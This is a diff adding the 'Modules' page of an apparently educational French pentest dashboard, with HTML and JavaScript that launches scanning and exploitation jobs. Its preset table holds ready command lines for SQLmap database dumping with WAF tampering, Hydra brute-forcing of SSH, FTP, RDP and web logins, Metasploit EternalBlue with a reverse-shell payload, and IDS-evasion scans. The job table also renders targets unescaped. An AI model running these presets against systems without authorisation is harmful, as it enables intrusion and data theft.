@@ -1,0 +1,721 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Modules – PentestBox</title>
+  <link rel="stylesheet" href="/static/css/app.css" />
+  <script src="https://unpkg.com/lucide@latest/dist/umd/lucide.min.js"></script>
+</head>
+<body>
+
+<aside class="sidebar">
+  <div class="sidebar-brand">
+    <div class="brand-icon"><i data-lucide="shield-check"></i></div>
+    <div><div class="brand-name">PentestBox</div><div class="brand-sub">v1.0.0</div></div>
+  </div>
+  <nav class="sidebar-nav">
+    <div class="nav-section-label">Navigation</div>
+    <a href="/dashboard" class="nav-item"><span class="nav-icon"><i data-lucide="layout-dashboard"></i></span> Dashboard</a>
+    <a href="/modules" class="nav-item active"><span class="nav-icon"><i data-lucide="wrench"></i></span> Modules</a>
+    <a href="/reports" class="nav-item"><span class="nav-icon"><i data-lucide="file-text"></i></span> Rapports</a>
+    <div class="nav-section-label" style="margin-top:16px">Défensif</div>
+    <a href="/siem" class="nav-item">
+      <span class="nav-icon"><i data-lucide="radar"></i></span> SIEM
+    </a>
+    <a href="#" class="nav-item" onclick="window.open('http://localhost:5601','_blank')">
+      <span class="nav-icon"><i data-lucide="external-link"></i></span> Kibana
+    </a>
+  </nav>
+  <div class="sidebar-footer">
+    <div class="user-info">
+      <div class="user-avatar" id="user-avatar">A</div>
+      <div><div class="user-name" id="user-name">–</div><div class="user-role" id="user-role">–</div></div>
+    </div>
+    <button class="btn-logout" onclick="logout()" title="Déconnexion"><i data-lucide="log-out"></i></button>
+  </div>
+</aside>
+
+<main class="main">
+  <header class="topbar">
+    <div class="topbar-left">
+      <h1 class="page-title">Modules Pentest</h1>
+      <span class="breadcrumb">Lancement de scans</span>
+    </div>
+    <div class="topbar-right">
+      <div class="status-dot" id="api-status"></div>
+      <span class="topbar-time" id="clock">–</span>
+    </div>
+  </header>
+
+  <div class="content">
+    <div class="modules-layout">
+
+      <!-- Sélecteur de module -->
+      <div class="module-cards">
+        <div class="module-card active" data-module="recon" onclick="selectModule('recon',this)">
+          <div class="mc-icon" style="background:rgba(59,130,246,.15);color:#60a5fa"><i data-lucide="radar" class="icon-lg"></i></div>
+          <div class="mc-body">
+            <div class="mc-name">Reconnaissance</div>
+            <div class="mc-desc">DNS · Nmap · Whois</div>
+          </div>
+          <div class="mc-arrow"><i data-lucide="chevron-right"></i></div>
+        </div>
+        <div class="module-card" data-module="scan" onclick="selectModule('scan',this)">
+          <div class="mc-icon" style="background:rgba(245,158,11,.15);color:#fbbf24"><i data-lucide="shield-alert" class="icon-lg"></i></div>
+          <div class="mc-body">
+            <div class="mc-name">Scan Vulnérabilités</div>
+            <div class="mc-desc">Nmap NSE · Nikto · SSLyze</div>
+          </div>
+          <div class="mc-arrow"><i data-lucide="chevron-right"></i></div>
+        </div>
+        <div class="module-card" data-module="exploit" onclick="selectModule('exploit',this)">
+          <div class="mc-icon" style="background:rgba(239,68,68,.15);color:#f87171"><i data-lucide="zap" class="icon-lg"></i></div>
+          <div class="mc-body">
+            <div class="mc-name">Exploitation</div>
+            <div class="mc-desc">SQLmap · Hydra · Metasploit</div>
+          </div>
+          <div class="mc-arrow"><i data-lucide="chevron-right"></i></div>
+        </div>
+        <div class="module-card" data-module="web_scan" onclick="selectModule('web_scan',this)">
+          <div class="mc-icon" style="background:rgba(139,92,246,.15);color:#a78bfa"><i data-lucide="globe" class="icon-lg"></i></div>
+          <div class="mc-body">
+            <div class="mc-name">Web / API</div>
+            <div class="mc-desc">OWASP ZAP · Dep-Check</div>
+          </div>
+          <div class="mc-arrow"><i data-lucide="chevron-right"></i></div>
+        </div>
+      </div>
+
+      <!-- Formulaire + progression -->
+      <div style="display:flex;flex-direction:column;gap:16px">
+
+        <!-- Formulaire de lancement -->
+        <div class="launch-panel">
+          <div class="panel-header">
+            <h2 class="panel-title" id="form-title">Reconnaissance</h2>
+            <span class="module-badge" id="form-badge">recon</span>
+          </div>
+          <form id="launch-form" onsubmit="launchScan(event)">
+            <div class="form-group">
+              <label>Cible <span class="label-hint">(IP, domaine ou URL)</span></label>
+              <input type="text" id="target" placeholder="ex: 192.168.1.1 ou example.com" required oninput="validateTarget()" />
+              <div id="target-error" class="field-error" style="display:none">
+                <i data-lucide="alert-circle"></i>
+                <span id="target-error-msg">Format invalide</span>
+              </div>
+            </div>
+            <div id="module-options"></div>
+            <button type="submit" class="btn-launch" id="btn-launch">
+              <span id="launch-spinner" class="spinner" style="display:none"></span>
+              <span id="launch-text"><i data-lucide="rocket"></i> Lancer le scan</span>
+            </button>
+          </form>
+        </div>
+
+        <!-- Barre de progression (masquée au départ) -->
+        <div id="progress-panel" style="display:none">
+          <div class="progress-panel">
+            <div class="progress-header">
+              <div class="progress-module-icon" id="prog-icon"><i data-lucide="radar" class="icon-lg"></i></div>
+              <div>
+                <div class="progress-title" id="prog-title">Reconnaissance en cours</div>
+                <div style="font-size:.78rem;color:var(--text-3);margin-top:2px" id="prog-target">–</div>
+              </div>
+              <span class="progress-status progress-status--pending" id="prog-status-badge">pending</span>
+            </div>
+
+            <div class="progress-body">
+              <!-- Barre -->
+              <div class="progress-bar-wrap">
+                <div class="progress-bar-track">
+                  <div class="progress-bar-fill" id="prog-bar" style="width:0%"></div>
+                </div>
+                <div class="progress-pct" id="prog-pct">0%</div>
+              </div>
+
+              <!-- Étape courante -->
+              <div class="progress-step">
+                <div class="step-dot" id="step-dot"></div>
+                <span id="prog-step">En attente de démarrage...</span>
+              </div>
+
+              <!-- Terminal CLI -->
+              <div class="terminal">
+                <div class="terminal-titlebar">
+                  <div class="term-dots">
+                    <span class="tdot tdot--red"></span>
+                    <span class="tdot tdot--yellow"></span>
+                    <span class="tdot tdot--green"></span>
+                  </div>
+                  <span class="terminal-title" id="term-title">bash — pentestbox@kali</span>
+                </div>
+                <div class="terminal-body" id="term-body">
+                  <div class="term-line">
+                    <span class="term-prompt">pentestbox@kali:~$</span>
+                    <span class="term-cursor"> █</span>
+                  </div>
+                </div>
+              </div>
+
+              <!-- Actions quand terminé -->
+              <div id="prog-actions" style="display:none;margin-top:16px;gap:10px">
+                <button class="btn-sm" onclick="genReport(currentJobId)" style="padding:8px 16px">
+                  <i data-lucide="file-text"></i> Générer le rapport
+                </button>
+                <button class="btn-sm" onclick="resetProgress()" style="padding:8px 16px">
+                  <i data-lucide="rotate-ccw"></i> Nouveau scan
+                </button>
+              </div>
+            </div>
+          </div>
+        </div>
+
+      </div>
+    </div>
+
+    <!-- Historique -->
+    <div class="panel" style="margin-top:24px">
+      <div class="panel-header">
+        <h2 class="panel-title">Historique des jobs</h2>
+        <button class="panel-action" onclick="loadJobs()"><i data-lucide="refresh-cw"></i> Actualiser</button>
+      </div>
+      <table class="table">
+        <thead>
+          <tr><th>#</th><th>Module</th><th>Cible</th><th>Statut</th><th>Date</th><th>Actions</th></tr>
+        </thead>
+        <tbody id="jobs-body">
+          <tr><td colspan="6" class="table-empty">Chargement…</td></tr>
+        </tbody>
+      </table>
+    </div>
+  </div>
+</main>
+
+<script src="/static/js/app.js"></script>
+<script>
+requireAuth();
+loadUserInfo();
+startClock();
+
+// ── Presets pour chaque outil (icon = lucide icon name) ─────
+const presets = {
+  nmap: {
+    quick:    { name: 'Quick',    icon: 'zap',           desc: 'Top 100 ports TCP, scan rapide SYN',                args: '-sS --top-ports 100 -T4' },
+    standard: { name: 'Standard', icon: 'shield',        desc: 'Détection services + OS sur top 1000 ports',        args: '-sV -O --top-ports 1000' },
+    full:     { name: 'Full TCP', icon: 'flame',         desc: 'Tous les ports TCP, scripts NSE par défaut',        args: '-sS -sV -O -p- -T4 --script=default' },
+    stealth:  { name: 'Stealth',  icon: 'eye-off',       desc: 'SYN scan lent avec fragmentation (évasion IDS)',    args: '-sS -T2 -f --top-ports 1000' },
+  },
+  nikto: {
+    quick:    { name: 'Quick',    icon: 'zap',           desc: 'Tests de base, fichiers exposés',                   args: '-h {target} -port {port} -Tuning x -nointeractive' },
+    standard: { name: 'Standard', icon: 'shield',        desc: 'Tuning x6 (CGI, fichiers, config, injection)',      args: '-h {target} -port {port} -Tuning x6 -nointeractive' },
+    full:     { name: 'Full',     icon: 'flame',         desc: 'Tous les modules de tests Nikto',                   args: '-h {target} -port {port} -Tuning 0123456789abc -nointeractive' },
+    evasion:  { name: 'Evasion',  icon: 'eye-off',       desc: 'Avec techniques d\'évasion IDS',                    args: '-h {target} -port {port} -evasion 1 -nointeractive' },
+  },
+  sslyze: {
+    cert:     { name: 'Certificat', icon: 'file-badge', desc: 'Infos certificat et chaîne uniquement',              args: '--certinfo {target}' },
+    standard: { name: 'Standard',   icon: 'shield',     desc: 'Audit TLS standard (protocoles + ciphers)',          args: '--regular {target}' },
+    full:     { name: 'Full',       icon: 'flame',      desc: 'Audit complet + Heartbleed + ROBOT',                 args: '--regular --certinfo --reneg --resum --heartbleed --robot {target}' },
+  },
+  sqlmap: {
+    quick:      { name: 'Quick',      icon: 'zap',      desc: 'Test rapide niveau 1, risk 1',                       args: '-u {target} --batch --level=1 --risk=1' },
+    standard:   { name: 'Standard',   icon: 'shield',   desc: 'Niveau 3, risk 2, 4 threads, random user-agent',     args: '-u {target} --batch --level=3 --risk=2 --random-agent --threads=4' },
+    aggressive: { name: 'Aggressive', icon: 'flame',    desc: 'Niveau 5 max, 10 threads, tamper anti-WAF',          args: '-u {target} --batch --level=5 --risk=3 --random-agent --threads=10 --tamper=space2comment' },
+    dump:       { name: 'Dump DB',    icon: 'database', desc: 'Énumère bases, tables et dump toutes les données',   args: '-u {target} --batch --dbs --tables --dump' },
+  },
+  hydra: {
+    ssh:  { name: 'SSH',       icon: 'lock',     desc: 'Brute-force SSH (port 22), 4 threads',                args: '-L /usr/share/wordlists/users.txt -P /usr/share/wordlists/rockyou.txt {target} ssh -t 4' },
+    ftp:  { name: 'FTP',       icon: 'folder',   desc: 'Brute-force FTP (port 21)',                           args: '-L /usr/share/wordlists/users.txt -P /usr/share/wordlists/rockyou.txt {target} ftp -t 4' },
+    http: { name: 'HTTP form', icon: 'globe',    desc: 'Brute-force formulaire HTTP POST (web login)',        args: '-L /usr/share/wordlists/users.txt -P /usr/share/wordlists/rockyou.txt {target} http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"' },
+    rdp:  { name: 'RDP',       icon: 'monitor',  desc: 'Brute-force Windows RDP (port 3389)',                 args: '-L /usr/share/wordlists/users.txt -P /usr/share/wordlists/rockyou.txt rdp://{target} -t 1' },
+  },
+  msf: {
+    handler:  { name: 'Handler',     icon: 'crosshair',     desc: 'Reverse shell handler générique sur 0.0.0.0:4444',  args: 'use exploit/multi/handler\nset PAYLOAD generic/shell_reverse_tcp\nset LHOST 0.0.0.0\nset LPORT 4444\nrun' },
+    eternal:  { name: 'EternalBlue', icon: 'skull',         desc: 'Exploit MS17-010 (Windows SMBv1, payload meterpreter)', args: 'use exploit/windows/smb/ms17_010_eternalblue\nset RHOSTS {target}\nset PAYLOAD windows/x64/meterpreter/reverse_tcp\nrun' },
+    portscan: { name: 'PortScan',    icon: 'search',        desc: 'Scanner TCP auxiliaire (1-65535)',                    args: 'use auxiliary/scanner/portscan/tcp\nset RHOSTS {target}\nset PORTS 1-65535\nrun' },
+    smb:      { name: 'SMB Vuln',    icon: 'octagon-alert', desc: 'Scanner de vulnérabilités SMB (MS17-010)',            args: 'use auxiliary/scanner/smb/smb_ms17_010\nset RHOSTS {target}\nrun' },
+  },
+  zap_spider: {
+    quick:    { name: 'Quick',    icon: 'zap',    desc: 'Crawl rapide profondeur 3',                          args: 'spider {target} --max-depth 3 --safe' },
+    standard: { name: 'Standard', icon: 'shield', desc: 'Crawl récursif profondeur 5',                        args: 'spider {target} --max-depth 5 --recursive --safe' },
+    deep:     { name: 'Deep',     icon: 'flame',  desc: 'Crawl profond depth 10 + sous-domaines inclus',      args: 'spider {target} --max-depth 10 --recursive --include-subdomains' },
+  },
+  zap_active: {
+    quick:    { name: 'Quick', icon: 'zap',    desc: 'XSS + SQLi uniquement (rapide)',                        args: 'active-scan {target} --scanners xss,sqli' },
+    owasp:    { name: 'OWASP', icon: 'shield', desc: 'OWASP Top 10 : XSS, SQLi, CSRF, SSRF',                  args: 'active-scan {target} --recursive --scanners xss,sqli,csrf,ssrf' },
+    full:     { name: 'Full',  icon: 'flame',  desc: 'Tous les scanners, intensité haute (long)',             args: 'active-scan {target} --recursive --scanners all --strength high' },
+  },
+};
+
+// ── Génère le bloc presets pour un outil ────────────────────
+function presetBlock(tool, taId, hint, defaultKey) {
+  const items = presets[tool];
+  const def   = defaultKey || Object.keys(items)[0];
+  const chips = Object.entries(items).map(([k, v]) =>
+    `<button type="button" class="chip ${k === def ? 'active' : ''}" data-tool="${tool}" data-key="${k}" onclick="loadPreset('${tool}','${k}','${taId}',this)"><i data-lucide="${v.icon}"></i>${v.name}</button>`
+  ).join('');
+  return `
+    <div class="preset-chips">${chips}</div>
+    <div class="preset-desc" id="${taId}-desc">${items[def].desc}</div>
+    <textarea id="${taId}" rows="3" class="cmd-textarea">${items[def].args}</textarea>
+    <div class="cmd-hint">${hint}</div>`;
+}
+
+function loadPreset(tool, key, taId, btn) {
+  const item = presets[tool][key];
+  if (!item) return;
+  document.getElementById(taId).value = item.args;
+  document.getElementById(taId + '-desc').textContent = item.desc;
+  document.querySelectorAll(`[data-tool="${tool}"]`).forEach(b => b.classList.remove('active'));
+  if (btn) btn.classList.add('active');
+}
+
+function toggleCmd(id, show) {
+  const el = document.getElementById(id);
+  if (el) el.style.display = show ? 'block' : 'none';
+}
+
+// ── Config modules ──────────────────────────────────────────
+const moduleConfig = {
+  recon: {
+    title: 'Reconnaissance', icon: 'radar',
+    iconBg: 'rgba(59,130,246,.15)', iconColor: '#60a5fa',
+    options: () => `
+      <div class="cmd-block">
+        <div class="cmd-label"><i data-lucide="wrench"></i> Outil — Nmap</div>
+        ${presetBlock('nmap', 'opt-nmap_args', 'Variables : <code>{target}</code> (ajouté automatiquement)', 'standard')}
+      </div>
+      <div class="form-group toggle-row">
+        <label>Activer Whois</label>
+        <label class="toggle"><input type="checkbox" id="opt-whois"><span class="toggle-slider"></span></label>
+      </div>`
+  },
+  scan: {
+    title: 'Scan de Vulnérabilités', icon: 'shield-alert',
+    iconBg: 'rgba(245,158,11,.15)', iconColor: '#fbbf24',
+    options: () => `
+      <div class="form-group">
+        <label>Port spécifique <span class="label-hint">(optionnel, défaut: 80)</span></label>
+        <input type="text" id="opt-port" placeholder="80" />
+      </div>
+
+      <div class="form-group toggle-row">
+        <label>Activer Nikto</label>
+        <label class="toggle"><input type="checkbox" id="opt-nikto" checked onchange="toggleCmd('nikto-cmd', this.checked)"><span class="toggle-slider"></span></label>
+      </div>
+      <div id="nikto-cmd" class="cmd-block">
+        <div class="cmd-label"><i data-lucide="bug"></i> Nikto — Scanner de vulnérabilités web</div>
+        ${presetBlock('nikto', 'opt-nikto_args', 'Variables : <code>{target}</code> <code>{port}</code>', 'standard')}
+      </div>
+
+      <div class="form-group toggle-row">
+        <label>Activer SSLyze</label>
+        <label class="toggle"><input type="checkbox" id="opt-sslyze" onchange="toggleCmd('sslyze-cmd', this.checked)"><span class="toggle-slider"></span></label>
+      </div>
+      <div id="sslyze-cmd" class="cmd-block" style="display:none">
+        <div class="cmd-label"><i data-lucide="lock"></i> SSLyze — Audit TLS/SSL</div>
+        ${presetBlock('sslyze', 'opt-sslyze_args', 'Variables : <code>{target}</code>', 'standard')}
+      </div>`
+  },
+  exploit: {
+    title: 'Exploitation', icon: 'zap',
+    iconBg: 'rgba(239,68,68,.15)', iconColor: '#f87171',
+    options: () => `
+      <div class="form-group">
+        <label>Outil d'exploitation</label>
+        <select id="opt-mode" onchange="switchExploitTool(this.value)">
+          <option value="sqlmap">SQLmap — Injection SQL</option>
+          <option value="hydra">Hydra — Brute-force credentials</option>
+          <option value="msf">Metasploit — Framework d'exploitation</option>
+        </select>
+      </div>
+
+      <div id="tool-sqlmap" class="cmd-block">
+        <div class="cmd-label"><i data-lucide="syringe"></i> SQLmap — Injection SQL automatisée</div>
+        ${presetBlock('sqlmap', 'opt-sqlmap_args', 'Variables : <code>{target}</code> (URL avec paramètre, ex: http://site.com/?id=1)', 'standard')}
+      </div>
+
+      <div id="tool-hydra" class="cmd-block" style="display:none">
+        <div class="cmd-label"><i data-lucide="key-round"></i> Hydra — Brute-force credentials multi-protocoles</div>
+        ${presetBlock('hydra', 'opt-hydra_args', 'Variables : <code>{target}</code> (IP ou hostname)', 'ssh')}
+      </div>
+
+      <div id="tool-msf" class="cmd-block" style="display:none">
+        <div class="cmd-label"><i data-lucide="bomb"></i> Metasploit Framework</div>
+        ${presetBlock('msf', 'opt-msf_args', 'Variables : <code>{target}</code> (RHOSTS)', 'handler')}
+      </div>`
+  },
+  web_scan: {
+    title: 'Scan Web / API', icon: 'globe',
+    iconBg: 'rgba(139,92,246,.15)', iconColor: '#a78bfa',
+    options: () => `
+      <div class="form-group">
+        <label>Type de scan ZAP</label>
+        <select id="opt-scan_type" onchange="switchZapMode(this.value)">
+          <option value="spider">Spider — Crawl passif</option>
+          <option value="active">Active scan — Tests actifs</option>
+        </select>
+      </div>
+
+      <div id="zap-spider" class="cmd-block">
+        <div class="cmd-label"><i data-lucide="bug"></i> ZAP Spider — Découverte d'URLs et endpoints</div>
+        ${presetBlock('zap_spider', 'opt-zap_spider_args', 'Variables : <code>{target}</code> (URL de base)', 'standard')}
+      </div>
+
+      <div id="zap-active" class="cmd-block" style="display:none">
+        <div class="cmd-label"><i data-lucide="zap"></i> ZAP Active Scan — Tests d'attaque actifs</div>
+        ${presetBlock('zap_active', 'opt-zap_active_args', 'Variables : <code>{target}</code> (URL cible)', 'owasp')}
+      </div>
+
+      <div class="form-group">
+        <label>URL du proxy ZAP <span class="label-hint">(défaut: localhost:8080)</span></label>
+        <input type="text" id="opt-zap_url" value="http://localhost:8080" />
+      </div>`
+  },
+};
+
+function switchExploitTool(tool) {
+  ['sqlmap', 'hydra', 'msf'].forEach(t => {
+    const el = document.getElementById('tool-' + t);
+    if (el) el.style.display = (t === tool) ? 'block' : 'none';
+  });
+}
+
+function switchZapMode(mode) {
+  document.getElementById('zap-spider').style.display = (mode === 'spider') ? 'block' : 'none';
+  document.getElementById('zap-active').style.display = (mode === 'active') ? 'block' : 'none';
+}
+
+let currentModule = 'recon';
+let currentJobId  = null;
+let currentTarget = '';
+let pollTimer     = null;
+
+// Init
+const qm = new URLSearchParams(location.search).get('m');
+selectModule(qm && moduleConfig[qm] ? qm : 'recon',
+             document.querySelector(`[data-module="${qm || 'recon'}"]`));
+loadJobs();
+if (window.lucide) lucide.createIcons();
+
+// ── Sélection module ────────────────────────────────────────
+function selectModule(name, el) {
+  currentModule = name;
+  document.querySelectorAll('.module-card').forEach(c => c.classList.remove('active'));
+  if (el) el.classList.add('active');
+  const cfg = moduleConfig[name];
+  document.getElementById('form-title').textContent = cfg.title;
+  document.getElementById('form-badge').textContent = name;
+  document.getElementById('module-options').innerHTML =
+    typeof cfg.options === 'function' ? cfg.options() : cfg.options;
+  if (window.lucide) lucide.createIcons();
+}
+
+function collectOptions() {
+  const opts = {};
+  document.querySelectorAll('#module-options input, #module-options select').forEach(el => {
+    const key = el.id.replace('opt-', '');
+    if (el.type === 'checkbox') opts[key] = el.checked;
+    else if (el.value !== '') opts[key] = el.value;
+  });
+  return opts;
+}
+
+// ── Validation cible ────────────────────────────────────────
+const RE_IPV4     = /^(\d{1,3}\.){3}\d{1,3}(\/\d{1,2})?$/;
+const RE_IPV6     = /^([0-9a-fA-F]{0,4}:){2,7}[0-9a-fA-F]{0,4}$/;
+const RE_DOMAIN   = /^([a-zA-Z0-9]([a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?\.)+[a-zA-Z]{2,}$/;
+const RE_URL      = /^https?:\/\/.+/;
+const RE_CIDR     = /^(\d{1,3}\.){3}\d{1,3}\/\d{1,2}$/;
+
+function isValidTarget(val) {
+  if (!val) return { valid: false, msg: 'Veuillez entrer une cible.' };
+  val = val.trim();
+
+  // URL valide (pour SQLmap, ZAP, etc.)
+  if (RE_URL.test(val)) return { valid: true };
+
+  // IPv4
+  if (RE_IPV4.test(val)) {
+    const parts = val.split('/')[0].split('.');
+    const ok = parts.every(p => parseInt(p) >= 0 && parseInt(p) <= 255);
+    if (!ok) return { valid: false, msg: 'Adresse IP invalide. Chaque octet doit etre entre 0 et 255.' };
+    return { valid: true };
+  }
+
+  // IPv6
+  if (RE_IPV6.test(val)) return { valid: true };
+
+  // Domaine
+  if (RE_DOMAIN.test(val)) return { valid: true };
+
+  // Sinon invalide
+  return {
+    valid: false,
+    msg: 'Format invalide. Entrez une adresse IP (ex: 192.168.1.1), un domaine (ex: example.com) ou une URL (ex: http://site.com).'
+  };
+}
+
+function validateTarget() {
+  const input   = document.getElementById('target');
+  const errDiv  = document.getElementById('target-error');
+  const errMsg  = document.getElementById('target-error-msg');
+  const val     = input.value.trim();
+
+  if (!val) {
+    errDiv.style.display = 'none';
+    input.classList.remove('input-invalid', 'input-valid');
+    return true;
+  }
+
+  const check = isValidTarget(val);
+  if (!check.valid) {
+    errDiv.style.display = 'flex';
+    errMsg.textContent   = check.msg;
+    input.classList.add('input-invalid');
+    input.classList.remove('input-valid');
+    if (window.lucide) lucide.createIcons();
+    return false;
+  }
+
+  errDiv.style.display = 'none';
+  input.classList.remove('input-invalid');
+  input.classList.add('input-valid');
+  return true;
+}
+
+// ── Lancement ───────────────────────────────────────────────
+async function launchScan(e) {
+  e.preventDefault();
+  const target = document.getElementById('target').value.trim();
+  if (!target) return;
+
+  // Validation visuelle (warning mais on laisse passer pour créer l'erreur côté serveur)
+  const targetValid = validateTarget();
+  currentTarget = target;
+
+  const btn     = document.getElementById('btn-launch');
+  const spinner = document.getElementById('launch-spinner');
+  const txt     = document.getElementById('launch-text');
+  btn.disabled = true;
+  spinner.style.display = 'inline-block';
+  txt.textContent = 'Lancement…';
+
+  try {
+    const job = await apiFetch('/api/modules/launch', {
+      method: 'POST',
+      body: JSON.stringify({ module: currentModule, target, options: collectOptions() }),
+    });
+
+    currentJobId = job.id;
+    showProgress(job.id, currentModule, target);
+    await loadJobs();
+  } catch (err) {
+    alert('Erreur : ' + err.message);
+    btn.disabled = false;
+    spinner.style.display = 'none';
+    txt.innerHTML = '<i data-lucide="rocket"></i> Lancer le scan';
+    if (window.lucide) lucide.createIcons();
+  }
+}
+
+// ── Affichage progression ───────────────────────────────────
+function showProgress(jobId, module, target) {
+  currentTarget = target;
+  const cfg = moduleConfig[module] || { title: module, icon: 'wrench', iconBg: 'rgba(255,255,255,.1)', iconColor: '#94a3b8' };
+  const iconEl = document.getElementById('prog-icon');
+  iconEl.innerHTML            = `<i data-lucide="${cfg.icon}" class="icon-lg"></i>`;
+  iconEl.style.background     = cfg.iconBg;
+  iconEl.style.color          = cfg.iconColor;
+  document.getElementById('prog-title').textContent  = cfg.title + ' en cours';
+  document.getElementById('prog-target').innerHTML   = `<i data-lucide="target" class="icon-sm"></i> ${target}`;
+  document.getElementById('term-title').textContent  = `bash — pentestbox@kali — ${module}`;
+  renderTerminal([], 'pending', module, target);
+  setProgressUI(0, 'En attente du worker Celery...', 'pending', []);
+  document.getElementById('progress-panel').style.display = 'block';
+  document.getElementById('prog-actions').style.display   = 'none';
+  if (window.lucide) lucide.createIcons();
+  startPolling(jobId);
+}
+
+function esc(s) {
+  return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+}
+
+function renderTerminal(logs, status, module, target) {
+  const body = document.getElementById('term-body');
+  let html = `<div class="term-line">
+    <span class="term-prompt">pentestbox@kali:~$</span>
+    <span class="term-cmd"> run_${esc(module)} --target ${esc(target)}</span>
+  </div>`;
+
+  if (!logs || logs.length === 0) {
+    html += `<div class="term-line"><span class="term-wait">Connexion au worker Celery<span class="term-cursor">...</span></span></div>`;
+  } else {
+    logs.forEach((l, i) => {
+      const isLast  = i === logs.length - 1;
+      const isErr   = /erreur|error|échec|failed/i.test(l.msg);
+      const isOk    = /terminé|succès|success/i.test(l.msg);
+      const cls     = isErr ? 'term-error' : (isOk && isLast ? 'term-success' : 'term-info');
+      const cursor  = (isLast && status !== 'done' && status !== 'error')
+                      ? '<span class="term-cursor"> █</span>' : '';
+      html += `<div class="term-line">
+        <span class="term-ts">[${esc(l.time)}]</span>
+        <span class="${cls}">${esc(l.msg)}${cursor}</span>
+      </div>`;
+    });
+  }
+
+  if (status === 'done') {
+    html += `<div class="term-line" style="margin-top:4px">
+      <span class="term-success">✔ Mission accomplie — résultats disponibles.</span>
+    </div>
+    <div class="term-line">
+      <span class="term-prompt">pentestbox@kali:~$</span>
+      <span class="term-cursor"> █</span>
+    </div>`;
+  } else if (status === 'error') {
+    html += `<div class="term-line" style="margin-top:4px">
+      <span class="term-error">✘ Erreur critique — vérifier la configuration.</span>
+    </div>`;
+  }
+
+  body.innerHTML = html;
+  body.scrollTop = body.scrollHeight;
+}
+
+function setProgressUI(pct, step, status, logs) {
+  const bar   = document.getElementById('prog-bar');
+  const pctEl = document.getElementById('prog-pct');
+  const stepEl= document.getElementById('prog-step');
+  const dot   = document.getElementById('step-dot');
+  const badge = document.getElementById('prog-status-badge');
+
+  bar.style.width   = pct + '%';
+  pctEl.textContent = pct + '%';
+  stepEl.textContent= step;
+
+  bar.className   = 'progress-bar-fill' + (status === 'done' ? ' done' : status === 'error' ? ' error' : '');
+  dot.className   = 'step-dot'          + (status === 'done' ? ' done' : status === 'error' ? ' error' : '');
+  badge.textContent  = status;
+  badge.className    = `progress-status progress-status--${status}`;
+
+  renderTerminal(logs, status, currentModule, currentTarget);
+}
+
+// ── Polling ─────────────────────────────────────────────────
+function startPolling(jobId) {
+  if (pollTimer) clearInterval(pollTimer);
+  pollTimer = setInterval(() => pollJob(jobId), 1500);
+}
+
+async function pollJob(jobId) {
+  const data = await apiFetch(`/api/modules/jobs/${jobId}`);
+  if (!data) return;
+
+  const { job, progress } = data;
+  const pct   = progress?.percent ?? 0;
+  const step  = progress?.step    ?? 'En cours...';
+  const logs  = progress?.logs    ?? [];
+  const status = job.status;
+
+  setProgressUI(pct, step, status, logs);
+
+  if (status === 'done' || status === 'error') {
+    clearInterval(pollTimer);
+    pollTimer = null;
+    document.getElementById('prog-actions').style.display = 'flex';
+
+    // Réactiver le bouton
+    const btn = document.getElementById('btn-launch');
+    const spinner = document.getElementById('launch-spinner');
+    const txt = document.getElementById('launch-text');
+    btn.disabled = false;
+    spinner.style.display = 'none';
+    txt.innerHTML = '<i data-lucide="rocket"></i> Lancer le scan';
+    if (window.lucide) lucide.createIcons();
+
+    await loadJobs();
+  }
+}
+
+function resetProgress() {
+  if (pollTimer) clearInterval(pollTimer);
+  document.getElementById('progress-panel').style.display = 'none';
+  currentJobId = null;
+}
+
+// ── Historique jobs ─────────────────────────────────────────
+async function loadJobs() {
+  const jobs = await apiFetch('/api/modules/jobs');
+  const tbody = document.getElementById('jobs-body');
+  if (!jobs || jobs.length === 0) {
+    tbody.innerHTML = '<tr><td colspan="6" class="table-empty">Aucun job</td></tr>';
+    return;
+  }
+  tbody.innerHTML = jobs.map(j => `
+    <tr>
+      <td class="td-id">#${j.id}</td>
+      <td><span class="badge badge--module">${j.module}</span></td>
+      <td class="td-target">${j.target}</td>
+      <td><span class="status status--${j.status}">${j.status}</span></td>
+      <td class="td-date">${formatDate(j.created_at)}</td>
+      <td style="display:flex;gap:6px;flex-wrap:wrap">
+        <button class="btn-sm" onclick="resumeProgress(${j.id},'${j.module}','${j.target}')"><i data-lucide="eye"></i> Voir</button>
+        <button class="btn-sm" onclick="genReport(${j.id})"><i data-lucide="file-text"></i> Rapport</button>
+        <button class="btn-sm btn-danger" onclick="deleteJob(${j.id})"><i data-lucide="trash-2"></i> Supprimer</button>
+      </td>
+    </tr>`).join('');
+  if (window.lucide) lucide.createIcons();
+}
+
+function resumeProgress(jobId, module, target) {
+  currentJobId  = jobId;
+  currentModule = module;
+  currentTarget = target;
+  showProgress(jobId, module, target);
+  pollJob(jobId);
+}
+
+async function genReport(jobId) {
+  try {
+    await apiFetch('/api/reports/generate', {
+      method: 'POST',
+      body: JSON.stringify({ scan_job_id: jobId, title: `Rapport job #${jobId}`, format: 'pdf' }),
+    });
+    showToast('✅ Rapport en cours de génération — disponible dans <a href="/reports" style="color:#93c5fd">Rapports</a> dans quelques secondes.', 'success');
+  } catch (err) {
+    showToast('❌ Erreur : ' + err.message, 'error');
+  }
+}
+
+function showToast(html, type = 'success') {
+  let container = document.getElementById('toast-container');
+  if (!container) {
+    container = document.createElement('div');
+    container.id = 'toast-container';
+    container.style.cssText = 'position:fixed;bottom:24px;right:24px;display:flex;flex-direction:column;gap:10px;z-index:9999';
+    document.body.appendChild(container);
+  }
+  const toast = document.createElement('div');
+  toast.innerHTML = html;
+  const bg = type === 'error' ? 'rgba(239,68,68,.15)' : 'rgba(34,197,94,.12)';
+  const border = type === 'error' ? 'rgba(239,68,68,.4)' : 'rgba(34,197,94,.35)';
+  toast.style.cssText = `background:${bg};border:1px solid ${border};color:#e2e8f0;padding:14px 20px;border-radius:10px;font-size:.88rem;max-width:360px;backdrop-filter:blur(8px);box-shadow:0 4px 24px rgba(0,0,0,.4);animation:fadeLog .2s ease`;
+  container.appendChild(toast);
+  setTimeout(() => toast.remove(), 5000);
+}
+
+async function deleteJob(jobId) {
+  if (!confirm(`Supprimer le job #${jobId} ? Cette action est irréversible.`)) return;
+  try {
+    await apiFetch(`/api/modules/jobs/${jobId}`, { method: 'DELETE' });
+    if (currentJobId === jobId) resetProgress();
+    await loadJobs();
+  } catch (err) {
